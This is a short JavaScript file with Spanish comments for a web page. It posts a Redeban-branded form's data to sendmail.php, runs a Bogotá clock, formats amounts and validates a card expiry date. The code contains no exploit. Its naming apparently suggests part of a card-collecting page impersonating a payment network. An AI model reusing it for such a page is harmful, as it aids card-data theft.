

document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.form-redeban');

    form.addEventListener('submit', function(event) {
        event.preventDefault();  // Prevenir el comportamiento por defecto de envío del formulario

        const formData = new FormData(form);
        fetch('sendmail.php', {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (response.ok) {
                alert('Formulario enviado con éxito!');  // Alert success message
                form.reset();  // Reset the form fields
                window.location.href = 'index.html'; // Redirigir al usuario a la página de inicio
            } else {
                throw new Error('Error en la respuesta del servidor.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error al enviar el formulario. Intente de nuevo.');
        });
    });
});

function actualizarFechaHora() {
    var now = new Date();
    var fechaHora = now.toLocaleString('es-CO', { timeZone: 'America/Bogota' }); // Configura la zona horaria a Bogotá, Colombia
    document.getElementById('fechaActual').innerHTML = 'Fecha Actual: ' + fechaHora;
}

// Actualiza la fecha y hora cada segundo
setInterval(actualizarFechaHora, 1000);

// Asegúrate de actualizar la fecha y hora tan pronto como se carga la página
window.onload = actualizarFechaHora;

function formatoMoneda(input) {
    // Eliminar cualquier cosa que no sea dígito o punto
    let valor = input.value.replace(/\D/g, '');

    // Convertir el texto limpio a un número entero
    let valorNumerico = parseInt(valor, 10);

    // Verificar si el valor es un número y formatearlo con separador de miles
    if (!isNaN(valorNumerico)) {
        // Convertir a string usando localización para puntos como separadores de miles
        input.value = valorNumerico.toLocaleString('es-CO');
    } else {
        // Si no es un número válido, simplemente limpia el campo
        input.value = '';
    }
}




document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.form-horizontal');
    form.addEventListener('submit', function(event) {
        const fechaVencimiento = document.getElementById('fecha_vencimiento');
        const regex = /^(0[1-9]|1[0-2])\/\d{4}$/; // Formato mm/aaaa

        if (!regex.test(fechaVencimiento.value)) {
            alert('Por favor, introduzca la fecha de vencimiento en formato mm/aaaa.');
            event.preventDefault(); // Detener el envío del formulario
            fechaVencimiento.focus(); // Enfocar el campo para corrección
        }
    });
});

